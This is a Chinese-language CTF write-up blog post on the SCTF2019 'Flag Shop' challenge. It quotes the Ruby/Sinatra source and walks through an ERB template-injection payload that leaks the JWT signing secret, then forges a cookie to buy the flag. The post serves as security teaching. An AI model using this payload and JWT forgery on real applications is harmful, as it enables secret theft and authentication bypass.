@@ -1,0 +1,273 @@
+<!DOCTYPE html><html lang="en" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>[SCTF2019]Flag Shop 1 | Hexo</title><meta name="author" content="John Doe"><meta name="copyright" content="John Doe"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="[SCTF2019]Flag Shop1ERB 的全称是 Embedded Ruby（嵌入式 Ruby），其实就是个动态模板  扫到robots.txt 打开发现filebak  filebak打开看到代码 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525">
+<meta property="og:type" content="article">
+<meta property="og:title" content="[SCTF2019]Flag Shop 1">
+<meta property="og:url" content="http://example.com/2026/03/01/ctf%E9%A2%98%E8%A7%A3/web/%5BSCTF2019%5DFlag%20Shop%201/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="[SCTF2019]Flag Shop1ERB 的全称是 Embedded Ruby（嵌入式 Ruby），其实就是个动态模板  扫到robots.txt 打开发现filebak  filebak打开看到代码 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://example.com/images/avatar.png">
+<meta property="article:published_time" content="2026-03-01T13:29:13.000Z">
+<meta property="article:modified_time" content="2026-06-22T13:40:21.904Z">
+<meta property="article:author" content="John Doe">
+<meta property="article:tag" content="CTF">
+<meta property="article:tag" content="JSON">
+<meta property="article:tag" content="JWT">
+<meta property="article:tag" content="Ook">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/images/avatar.png"><script type="application/ld+json">{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "[SCTF2019]Flag Shop 1",
+  "url": "http://example.com/2026/03/01/ctf%E9%A2%98%E8%A7%A3/web/%5BSCTF2019%5DFlag%20Shop%201/",
+  "image": "http://example.com/images/avatar.png",
+  "datePublished": "2026-03-01T13:29:13.000Z",
+  "dateModified": "2026-06-22T13:40:21.904Z",
+  "author": [
+    {
+      "@type": "Person",
+      "name": "John Doe",
+      "url": "http://example.com"
+    }
+  ]
+}</script><link rel="shortcut icon" href="/images/favicon.png"><link rel="canonical" href="http://example.com/2026/03/01/ctf%E9%A2%98%E8%A7%A3/web/%5BSCTF2019%5DFlag%20Shop%201/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css?v=5.5.5"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@7.2.0/css/all.min.css"><script>
+    (() => {
+      
+    const saveToLocal = {
+      set: (key, value, ttl) => {
+        if (!ttl) return
+        const expiry = Date.now() + ttl * 86400000
+        localStorage.setItem(key, JSON.stringify({ value, expiry }))
+      },
+      get: key => {
+        const itemStr = localStorage.getItem(key)
+        if (!itemStr) return undefined
+        const { value, expiry } = JSON.parse(itemStr)
+        if (Date.now() > expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return value
+      }
+    }
+
+    window.btf = {
+      saveToLocal,
+      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
+        script.onload = script.onreadystatechange = () => {
+          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
+        }
+        script.onerror = reject
+        document.head.appendChild(script)
+      }),
+      getCSS: (url, id) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onload = link.onreadystatechange = () => {
+          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
+        }
+        link.onerror = reject
+        document.head.appendChild(link)
+      }),
+      addGlobalFn: (key, fn, name = false, parent = window) => {
+        if (!false && key.startsWith('pjax')) return
+        const globalFn = parent.globalFn || {}
+        globalFn[key] = globalFn[key] || {}
+        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
+        parent.globalFn = globalFn
+      }
+    }
+  
+      
+      const activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      const activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+
+      btf.activateDarkMode = activateDarkMode
+      btf.activateLightMode = activateLightMode
+
+      const theme = saveToLocal.get('theme')
+    
+          theme === 'dark' ? activateDarkMode() : theme === 'light' ? activateLightMode() : null
+        
+      
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
+      }
+    
+      
+    const detectApple = () => {
+      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+  
+    })()
+  </script><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"/search.xml","preload":false,"top_n_per_article":1,"unescape":false,"pagination":{"enable":false,"hitsPerPage":8},"languages":{"hits_empty":"No results found for: ${query}","hits_stats":"${hits} articles found"}},
+  translate: undefined,
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false,"highlightFullpage":false,"highlightMacStyle":false},
+  copy: {
+    success: 'Copy Successful',
+    error: 'Copy Failed',
+    noSupport: 'Browser Not Supported'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  dateSuffix: {
+    just: 'Just now',
+    min: 'minutes ago',
+    hour: 'hours ago',
+    day: 'days ago',
+    month: 'months ago'
+  },
+  copyright: undefined,
+  lightbox: 'null',
+  Snackbar: undefined,
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid@4.13.0/dist/infinitegrid.min.js',
+    buttonText: 'Load More'
+  },
+  isPhotoFigcaption: false,
+  islazyloadPlugin: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: '[SCTF2019]Flag Shop 1',
+  isHighlightShrink: false,
+  isToc: true,
+  pageType: 'post'
+}</script><meta name="generator" content="Hexo 8.1.2"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img text-center"><img src="/images/avatar.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data text-center"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">121</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">70</div></a><a href="/categories/"><div class="headline">Categories</div><div class="length-num">8</div></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-user"></i><span> 关于我</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><span class="site-name">Hexo</span></a><a class="nav-page-title" href="/"><span class="site-name">[SCTF2019]Flag Shop 1</span><span class="site-name"><i class="fa-solid fa-circle-arrow-left"></i><span>  Back to Home</span></span></a></span><div id="menus"><div id="search-button"><span class="site-page social-icon search"><i class="fas fa-search fa-fw"></i><span> Search</span></span></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-user"></i><span> 关于我</span></a></div></div><div id="toggle-menu"><span class="site-page"><i class="fas fa-bars fa-fw"></i></span></div></div></nav><div id="post-info"><h1 class="post-title">[SCTF2019]Flag Shop 1</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">Created</span><time class="post-meta-date-created" datetime="2026-03-01T13:29:13.000Z" title="Created 2026-03-01 21:29:13">2026-03-01</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">Updated</span><time class="post-meta-date-updated" datetime="2026-06-22T13:40:21.904Z" title="Updated 2026-06-22 21:40:21">2026-06-22</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/web/">web</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title=""><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">Post Views:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="container post-content" id="article-container"><h1 id="SCTF2019-Flag-Shop"><a href="#SCTF2019-Flag-Shop" class="headerlink" title="[SCTF2019]Flag Shop"></a>[SCTF2019]Flag Shop</h1><h1 id="1"><a href="#1" class="headerlink" title="1"></a>1</h1><p><code>ERB</code> 的全称是 <em>Embedded Ruby</em>（嵌入式 Ruby），其实就是个动态模板</p>
+<hr>
+<p>扫到robots.txt</p>
+<p>打开发现filebak</p>
+<p><img src="C:\Users\21709\AppData\Roaming\Typora\typora-user-images\image-20260301205057132.png" alt="image-20260301205057132"></p>
+<p>filebak打开看到代码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre><span class="line">require &#x27;sinatra&#x27;</span><br><span class="line">require &#x27;sinatra/cookies&#x27;</span><br><span class="line">require &#x27;sinatra/json&#x27;</span><br><span class="line">require &#x27;jwt&#x27;</span><br><span class="line">require &#x27;securerandom&#x27;</span><br><span class="line">require &#x27;erb&#x27;</span><br><span class="line"></span><br><span class="line">set :public_folder, File.dirname(__FILE__) + &#x27;/static&#x27;</span><br><span class="line"></span><br><span class="line">FLAGPRICE = 1000000000000000000000000000</span><br><span class="line">ENV[&quot;SECRET&quot;] = SecureRandom.hex(64)</span><br><span class="line"></span><br><span class="line">configure do</span><br><span class="line">  enable :logging</span><br><span class="line">  file = File.new(File.dirname(__FILE__) + &#x27;/../log/http.log&#x27;,&quot;a+&quot;)</span><br><span class="line">  file.sync = true</span><br><span class="line">  use Rack::CommonLogger, file</span><br><span class="line">end</span><br><span class="line"></span><br><span class="line">get &quot;/&quot; do</span><br><span class="line">  redirect &#x27;/shop&#x27;, 302</span><br><span class="line">end</span><br><span class="line"></span><br><span class="line">get &quot;/filebak&quot; do</span><br><span class="line">  content_type :text</span><br><span class="line">  erb IO.binread __FILE__</span><br><span class="line">end</span><br><span class="line"></span><br><span class="line">get &quot;/api/auth&quot; do</span><br><span class="line">  payload = &#123; uid: SecureRandom.uuid , jkl: 20&#125;</span><br><span class="line">  auth = JWT.encode payload,ENV[&quot;SECRET&quot;] , &#x27;HS256&#x27;</span><br><span class="line">  cookies[:auth] = auth</span><br><span class="line">end</span><br><span class="line"></span><br><span class="line">get &quot;/api/info&quot; do</span><br><span class="line">  islogin</span><br><span class="line">  auth = JWT.decode cookies[:auth],ENV[&quot;SECRET&quot;] , true, &#123; algorithm: &#x27;HS256&#x27; &#125;</span><br><span class="line">  json(&#123;uid: auth[0][&quot;uid&quot;],jkl: auth[0][&quot;jkl&quot;]&#125;)</span><br><span class="line">end</span><br><span class="line"></span><br><span class="line">get &quot;/shop&quot; do</span><br><span class="line">  erb :shop</span><br><span class="line">end</span><br><span class="line"></span><br><span class="line">get &quot;/work&quot; do</span><br><span class="line">  islogin</span><br><span class="line">  auth = JWT.decode cookies[:auth],ENV[&quot;SECRET&quot;] , true, &#123; algorithm: &#x27;HS256&#x27; &#125;</span><br><span class="line">  auth = auth[0]</span><br><span class="line">  unless params[:SECRET].nil?</span><br><span class="line">    if ENV[&quot;SECRET&quot;].match(&quot;#&#123;params[:SECRET].match(/[0-9a-z]+/)&#125;&quot;)</span><br><span class="line">      puts ENV[&quot;FLAG&quot;]	//我们的目标在这ma?</span><br><span class="line">      输出位置（关键）：puts 指令在服务端编程中是把内容打印到 服务器的控制台（黑窗口），而不是返回给你的 浏览器页面。即便你触发了这一行，Flag 也只是印在选手的服务器后台，你在屏幕上什么也看不到。</span><br><span class="line">    end</span><br><span class="line">  end</span><br><span class="line"></span><br><span class="line">  if params[:do] == &quot;#&#123;params[:name][0,7]&#125; is working&quot; then</span><br><span class="line"></span><br><span class="line">    auth[&quot;jkl&quot;] = auth[&quot;jkl&quot;].to_i + SecureRandom.random_number(10)</span><br><span class="line">    auth = JWT.encode auth,ENV[&quot;SECRET&quot;] , &#x27;HS256&#x27;</span><br><span class="line">    cookies[:auth] = auth</span><br><span class="line">    ERB::new(&quot;&lt;script&gt;alert(&#x27;#&#123;params[:name][0,7]&#125; working successfully!&#x27;)&lt;/script&gt;&quot;).result</span><br><span class="line"></span><br><span class="line">  end</span><br><span class="line">end</span><br><span class="line"></span><br><span class="line">post &quot;/shop&quot; do</span><br><span class="line">  islogin</span><br><span class="line">  auth = JWT.decode cookies[:auth],ENV[&quot;SECRET&quot;] , true, &#123; algorithm: &#x27;HS256&#x27; &#125;</span><br><span class="line"></span><br><span class="line">  if auth[0][&quot;jkl&quot;] &lt; FLAGPRICE then</span><br><span class="line"></span><br><span class="line">    json(&#123;title: &quot;error&quot;,message: &quot;no enough jkl&quot;&#125;)</span><br><span class="line">  else</span><br><span class="line"></span><br><span class="line">    auth &lt;&lt; &#123;flag: ENV[&quot;FLAG&quot;]&#125;</span><br><span class="line">    auth = JWT.encode auth,ENV[&quot;SECRET&quot;] , &#x27;HS256&#x27;</span><br><span class="line">    cookies[:auth] = auth</span><br><span class="line">    json(&#123;title: &quot;success&quot;,message: &quot;jkl is good thing&quot;&#125;)</span><br><span class="line">  end</span><br><span class="line">end</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def islogin</span><br><span class="line">  if cookies[:auth].nil? then</span><br><span class="line">    redirect to(&#x27;/shop&#x27;)</span><br><span class="line">  end</span><br><span class="line">end</span><br></pre></td></tr></table></figure>
+
+
+
+<ol>
+<li></li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">if ENV[&quot;SECRET&quot;].match(&quot;#&#123;params[:SECRET].match(/[0-9a-z]+/)&#125;&quot;)</span><br><span class="line">      puts ENV[&quot;FLAG&quot;]</span><br></pre></td></tr></table></figure>
+
+<p>我们让传入的secret为空，就变成了<code>ENV[&quot;SECRET&quot;].match(&quot; &quot;)</code>,当而外面的match匹配到了空，</p>
+<p>$’的意思为选取 “匹配成功后的后面的全部字符”</p>
+<p>那$’为key了</p>
+<ol start="2">
+<li></li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">if params[:do] == &quot;#&#123;params[:name][0,7]&#125; is working&quot; then</span><br><span class="line"></span><br><span class="line">    ...</span><br><span class="line">    </span><br><span class="line">    ERB::new(&quot;&lt;script&gt;alert(&#x27;#&#123;params[:name][0,7]&#125; working successfully!&#x27;)&lt;/script&gt;&quot;).result</span><br><span class="line">	//最后 .result 返回处理完的纯 HTML 给浏览器</span><br></pre></td></tr></table></figure>
+
+<p>我们要在这里插入<code>name=&lt;%=$&#39;%&gt;</code></p>
+<p>erb就回去找$’，然后用result把结果给我们看</p>
+<ol start="3">
+<li></li>
+</ol>
+<p>但这里需要params[:do] &#x3D;&#x3D; “#{params[:name][0,7]} is working”</p>
+<p><code>do=&lt;%=$&#39;%&gt; is working</code></p>
+<p>payload</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?name=&lt;%=$&#x27;%&gt;&amp;do=&lt;%=$&#x27;%&gt; is working&amp;SECRET=</span><br></pre></td></tr></table></figure>
+
+<p>拿到key</p>
+<p><img src="C:\Users\21709\AppData\Roaming\Typora\typora-user-images\image-20260301211735220.png" alt="image-20260301211735220"></p>
+<p>key：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">63d90e4f927ffcb3e25521ee51110a546eaf3f47f016b1e749ef6ba0ab321133c9e14c3483a838e0db99ce91f47042e4d5cc5f36e1b39a57c57a37afebb50abe</span><br></pre></td></tr></table></figure>
+
+<p>去改cookie</p>
+<p><a target="_blank" rel="noopener" href="https://www.bejson.com/jwt/">https://www.bejson.com/jwt/</a></p>
+<p><img src="C:\Users\21709\AppData\Roaming\Typora\typora-user-images\image-20260301212132917.png" alt="image-20260301212132917"></p>
+<p>抓包上传cookie</p>
+<p>源代码里面是post，不是get，要注意一下</p>
+<p><img src="C:\Users\21709\AppData\Roaming\Typora\typora-user-images\image-20260301212547871.png" alt="image-20260301212547871"></p>
+<p>得到</p>
+<p><img src="C:\Users\21709\AppData\Roaming\Typora\typora-user-images\image-20260301212205681.png" alt="image-20260301212205681"></p>
+<p>解码</p>
+<p><img src="C:\Users\21709\AppData\Roaming\Typora\typora-user-images\image-20260301212240348.png" alt="image-20260301212240348"></p>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>Author: </span><span class="post-copyright-info"><a href="http://example.com">John Doe</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>Link: </span><span class="post-copyright-info"><a href="http://example.com/2026/03/01/ctf%E9%A2%98%E8%A7%A3/web/%5BSCTF2019%5DFlag%20Shop%201/">http://example.com/2026/03/01/ctf%E9%A2%98%E8%A7%A3/web/%5BSCTF2019%5DFlag%20Shop%201/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>Copyright Notice: </span><span class="post-copyright-info">All articles on this blog are licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> unless otherwise stated.</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/Ook/">Ook</a><a class="post-meta__tags" href="/tags/CTF/">CTF</a><a class="post-meta__tags" href="/tags/JSON/">JSON</a><a class="post-meta__tags" href="/tags/JWT/">JWT</a></div><div class="post-share"><div class="social-share" data-image="/images/avatar.png" data-sites="facebook,x,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.6/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.6/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><a class="pagination-related" href="/2026/03/02/ctf%E9%A2%98%E8%A7%A3/reverse/moectf2025%20upx/" title="moectf2025 upx"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info"><div class="info-1"><div class="info-item-1">Previous</div><div class="info-item-2">moectf2025 upx</div></div><div class="info-2"><div class="info-item-1">moectf2025 upx壳是什么？upx是什么？upx可以用来干什么？1. 什么是“壳”？壳是一段包裹在程序外面的辅助代码。  作用：程序启动时，壳先运行，负责把里面真正的程序解压或解密到内存里，然后再运行程序。 分类：一种是为了减小体积（压缩壳），一种是为了防止被破解（加密壳）。  2. 什么是 UPX？UPX 是一个开源的软件工具。  定位：它是目前最流行的“压缩壳”工具。 特点：压缩率高、解压速度极快，支持 Windows、Linux 等多种系统。  3. UPX 可以用来干什么？ 压缩文件：把 10MB 的 .exe 变成 3MB，节省磁盘和带宽。 加壳：给程序穿衣服，隐藏原始代码，让别人没法直接看到程序里的文字信息。 脱壳：使用 upx -d 命令，把被 UPX 压缩过的程序还原成原始状态，方便分析代码。   题目一打开，函数这么少根本不可能，肯定是有壳在外面把它压缩了  先查看壳，用exeinfo，把文件托进快捷方式就ok  发现upx，用upx去壳 拿到后shift+f12字符串查看，看到可疑字符串双击，按x搜索到具体位置，f5反汇编 123v8 = Buffe...</div></div></div></a><a class="pagination-related" href="/2026/03/01/ctf%E9%A2%98%E8%A7%A3/web/%5BHarekazeCTF2019%5Dencode_and_encode%201/" title="[HarekazeCTF2019]encode_and_encode 1"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-right"><div class="info-1"><div class="info-item-1">Next</div><div class="info-item-2">[HarekazeCTF2019]encode_and_encode 1</div></div><div class="info-2"><div class="info-item-1">[HarekazeCTF2019]encode_and_encode11.php对请求体body的两种处理逻辑： 逻辑 A：自动解析到 $_POST当 PHP 接收到 POST 请求时，它会先查看 Header 中的 Content-Type：  如果 Content-Type 是 application/x-www-form-urlencoded（普通表单）或 multipart/form-data（带文件的表单）。 PHP 解释器会自动触发解析引擎。 它会将 Body 里的字符串按照 key=value 的格式拆解，并填充到全局数组 $_POST 中。 限制：如果格式不是上述两种（例如是 application/json），PHP 的解析引擎就不会动作，$_POST 就会保持为空。  逻辑 B：原始读取到 php://inputphp://input 是一个只读的流（Stream），它直接指向 HTTP 请求的 Body 原始区域：  它不经过 PHP 的“解析引擎”，因此不需要关心 Content-Type。 它直接访问内存中存放 Body 字节流的地址。 结果：无论你发的...</div></div></div></a></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>Related Articles</span></div><div class="relatedPosts-list"><a class="pagination-related" href="/2026/03/07/ctf%E9%A2%98%E8%A7%A3/%E5%BF%AB%E9%80%9F%E5%85%A5%E9%97%A8crypto%E5%8F%8Abuuctf%E9%A2%98%E8%A7%A3/" title="快速入门crypto及buuctf题解"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2026-03-07</div><div class="info-item-2">快速入门crypto及buuctf题解</div></div><div class="info-2"><div class="info-item-1">快速入门crypto及buuctf题解大帝的密码武器1题解 FRPHEVGL偏移13位security 密文：ComeChina，通过偏移13 得到flag，注意大小写 看我回旋踢1 遇到synt{xx-xx-xx} 判定他为rot13； 题目一般都是提示信息，“回旋踢”就暗示了rot13的特点，会重新绕回；  flag{5cd1004d-86a5-46d8-b720-beb5ba0417e1} moectf misc Cor1e的支票解码网站：https://www.dcode.fr/ook-language Ook编码详解123 Ook! 是一种基于极简主义设计的编程语言，属于 esolang（怪异语言）的一种。它是从 Brainfuck 演变而来的，主要用于编码和解码任务。Ook! 的指令由简单的短语组成，例如 Ook. Ook? 或 Ook! Ook!，这些短语对应 Brainfuck 的操作符。 编码规则 Ook! 使用一组固定的短语来表示操作符，每个短语由两个单词组成。以下是 Ook! 和 Brainfuck 的对应关系：  Ook. Ook. 对应 &gt;（指针右...</div></div></div></a><a class="pagination-related" href="/2026/06/22/ctf%E9%A2%98%E8%A7%A3/web/NewStar%20CTF%202025%20Week3-who'ssti/" title="NewStar CTF 2025 Week3-who&#39;ssti"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2026-06-22</div><div class="info-item-2">NewStar CTF 2025 Week3-who&#39;ssti</div></div><div class="info-2"><div class="info-item-1">NewStar CTF 2025 Week3-who’ssti 提交你的代码，让后端看看你的厉害！​        提交一下：                      尝试调用到这些函数！  fmean get_close_matches randint findall mean   看到题目ssti也看到了注入点，但是尝试一些模板注入的payload发现没用？为什么呢？因为flag不能被直接调用————详见源码第12行 尝试读源码，看看这些函数是不是一定要调用才能完成这道题目 1.源码1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374from flask import Flask, jsonify, request, render_template_string, render_templateimport sys, randomfunc_List =...</div></div></div></a><a class="pagination-related" href="/2026/03/01/ctf%E9%A2%98%E8%A7%A3/web/%5BHarekazeCTF2019%5Dencode_and_encode%201/" title="[HarekazeCTF2019]encode_and_encode 1"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2026-03-01</div><div class="info-item-2">[HarekazeCTF2019]encode_and_encode 1</div></div><div class="info-2"><div class="info-item-1">[HarekazeCTF2019]encode_and_encode11.php对请求体body的两种处理逻辑： 逻辑 A：自动解析到 $_POST当 PHP 接收到 POST 请求时，它会先查看 Header 中的 Content-Type：  如果 Content-Type 是 application/x-www-form-urlencoded（普通表单）或 multipart/form-data（带文件的表单）。 PHP 解释器会自动触发解析引擎。 它会将 Body 里的字符串按照 key=value 的格式拆解，并填充到全局数组 $_POST 中。 限制：如果格式不是上述两种（例如是 application/json），PHP 的解析引擎就不会动作，$_POST 就会保持为空。  逻辑 B：原始读取到 php://inputphp://input 是一个只读的流（Stream），它直接指向 HTTP 请求的 Body 原始区域：  它不经过 PHP 的“解析引擎”，因此不需要关心 Content-Type。 它直接访问内存中存放 Body 字节流的地址。 结果：无论你发的...</div></div></div></a><a class="pagination-related" href="/2026/01/21/ctf/misc/Ook%E7%BC%96%E7%A0%81%E8%AF%A6%E8%A7%A3/" title="Ook编码详解"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2026-01-21</div><div class="info-item-2">Ook编码详解</div></div><div class="info-2"><div class="info-item-1">Ook编码详解1 2 3 Ook! 是一种基于极简主义设计的编程语言，属于 esolang（怪异语言）的一种。它是从 Brainfuck 演变而来的，主要用于编码和解码任务。Ook! 的指令由简单的短语组成，例如 Ook. Ook? 或 Ook! Ook!，这些短语对应 Brainfuck 的操作符。 编码规则 Ook! 使用一组固定的短语来表示操作符，每个短语由两个单词组成。以下是 Ook! 和 Brainfuck 的对应关系：  Ook. Ook. 对应 &gt;（指针右移） Ook! Ook! 对应 &lt;（指针左移） Ook. Ook! 对应 +（当前单元格值加一） Ook! Ook. 对应 -（当前单元格值减一） Ook! Ook? 对应 [（循环开始） Ook? Ook! 对应 ]（循环结束） Ook. Ook? 对应 .（输出当前单元格值） Ook? Ook. 对应 ,（输入值到当前单元格）  </div></div></div></a><a class="pagination-related" href="/2026/03/12/ctf%E9%A2%98%E8%A7%A3/web/NewStar%20CTF%202025%20Week2-%E6%90%9E%E7%82%B9%E5%93%A6%E6%B6%A6%E5%90%89%E5%90%83%E5%90%83%F0%9F%8D%8A/" title="NewStar CTF 2025 Week2-搞点哦润吉吃吃🍊"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2026-03-12</div><div class="info-item-2">NewStar CTF 2025 